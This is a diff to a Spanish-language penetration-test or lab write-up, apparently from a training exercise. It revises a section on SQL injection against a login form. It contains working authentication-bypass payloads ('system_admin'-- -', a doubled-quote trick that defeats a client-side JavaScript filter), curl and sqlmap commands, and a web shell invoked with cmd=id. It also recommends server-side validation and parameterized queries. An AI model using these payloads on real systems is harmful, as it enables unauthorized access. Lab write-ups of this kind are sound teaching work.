@@ -192,36 +192,61 @@ Toda la información obtenida fue almacenada en un fichero CSV para facilitar su
 
 ## Pruebas de SQL Injection
 
-Una vez identificado un posible usuario válido, se procede a comprobar si el formulario es vulnerable a SQL Injection.
+Una vez identificado el posible usuario válido `system_admin`, se procede a comprobar si el formulario de autenticación es vulnerable a SQL Injection.
 
-Se prueban payloads clásicos como:
+Durante el análisis del código fuente del formulario se identifica un filtro JavaScript aplicado al campo de usuario:
 
-```text
-' OR '1'='1
+```html
+<script>
+function badUsernameFilter(input) {
+    if (input.value.includes("'") || input.value.includes("#")) {
+        input.value = input.value.replace("'", "");
+        input.value = input.value.replace("#", "");
+    }
+}
+</script>
 ```
 
-y:
+Este filtro elimina los caracteres ' y # cuando el usuario los introduce desde el navegador. Sin embargo, se trata de una validación realizada únicamente en el lado cliente, por lo que no constituye una medida de seguridad efectiva. Un atacante puede evitarla enviando la petición directamente al servidor mediante herramientas como curl, Burp Suite o SQLMap.
 
-```text
-admin'-- -
-```
-
-mediante:
+La prueba mediante curl permite enviar el payload sin pasar por el filtro JavaScript del navegador:
 
 ```bash
-curl -X POST \
-http://192.168.129.129:8080/login.php \
--d "username=admin'-- -&password=test"
+curl -i -X POST \
+http://<IP_SERVIDOR>:8080/login.php \
+-d "username=system_admin'-- -&password=test"
+```
+El payload utilizado es:
+
+```
+system_admin'-- -
 ```
 
-Asimismo, se captura una petición con Burp Suite para analizarla con SQLMap:
+La comilla simple cierra la cadena del nombre de usuario en la consulta SQL y la secuencia -- - comenta el resto de la consulta, anulando la comprobación de la contraseña.
 
-```bash
-sqlmap -r login.req --batch --dbs
+Además, se comprueba que el filtro puede ser eludido también desde el propio formulario web introduciendo una doble comilla simple:
+
+```
+system_admin''-- -
 ```
 
----
+En este caso, el filtro JavaScript elimina únicamente una de las comillas simples, dejando finalmente el payload efectivo:
 
+```
+system_admin'-- -
+```
+
+De esta forma, aunque el formulario intenta bloquear caracteres peligrosos en el navegador, la protección resulta insuficiente. La validación debería realizarse en el servidor y las consultas SQL deberían construirse mediante consultas preparadas o parametrizadas.
+
+La explotación confirma que es posible autenticarse como el usuario system_admin sin conocer su contraseña, obteniendo acceso al panel interno de la aplicación.
+
+<div align="center">
+
+<p><strong>Explotación del login mediante SQL Injection</strong></p>
+
+<video src="./img/vulneracion-login-sqli.mp4" controls width="800"></video>
+
+</div>
 ## Análisis del directorio uploads
 
 Durante la enumeración previa se había identificado el directorio:
@@ -256,7 +281,7 @@ shell.php
 Tras subir el archivo, se verifica su ejecución mediante:
 
 ```text
-http://192.168.129.129:8080/uploads/shell.php?cmd=id
+http://<IP_SERVIDOR>:8080/uploads/shell.php?cmd=id
 ```
 
 obteniéndose:
